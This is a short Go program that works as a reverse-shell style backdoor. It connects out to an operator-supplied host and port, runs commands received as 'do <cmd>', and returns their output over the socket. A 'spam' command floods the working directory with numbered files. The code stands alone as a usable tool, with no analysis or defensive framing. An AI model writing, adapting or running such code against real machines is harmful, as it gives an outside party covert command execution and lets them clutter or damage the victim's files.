package main

import (
        "bufio"
        "fmt"
        "net"
        "os"
        "strings"
        "os/exec"
        "io/ioutil"
        "strconv"
)

func command(cmd string) string {
  out, err := exec.Command(cmd).Output()
  if err != nil {
    return "nil"
  }
  output := string(out[:])
  return output
}

func main() {
        arguments := os.Args
        if len(arguments) == 1 {
                fmt.Println("Please provide host:port.")
                return
        }

        CONNECT := arguments[1]
        c, err := net.Dial("tcp", CONNECT)
        if err != nil {
                fmt.Println(err)
                return
        }

        var iter int = 1

        for {
          message, _ := bufio.NewReader(c).ReadString('\n')

          if strings.TrimSpace(string(message)) == "STOP" {
            fmt.Println("TCP client exiting...")
            fmt.Fprintf(c, "STOP")
            return
          }

          var output string

          words := strings.Split(string(message), " ")

          if words[0] == "spam" {
            words[1] = strings.TrimSpace(string(words[1]))
            n, err := strconv.Atoi(words[1])
            if err != nil {
              fmt.Println(err)
              return
            }
            for i:=0; i < n+1; i++ {
              err := ioutil.WriteFile(strconv.Itoa(i) + "file.txt", []byte("Hello"), 0755)
              if err != nil {
                fmt.Print("[-] Failed to write file")
              }
            }
          }

          if words[0] == "do" {

            msg := []rune(message)
            cmd := string(msg[3:len(message)])
            fmt.Println(cmd)
            output = command(strings.TrimSpace(cmd))
            if output == "nil" {
              return
              }
            fmt.Println(output)
            output = strings.Replace(output, "\n", " ", -1)
          }

          fmt.Fprintf(c, output+"\n")

          iter++

        }
}
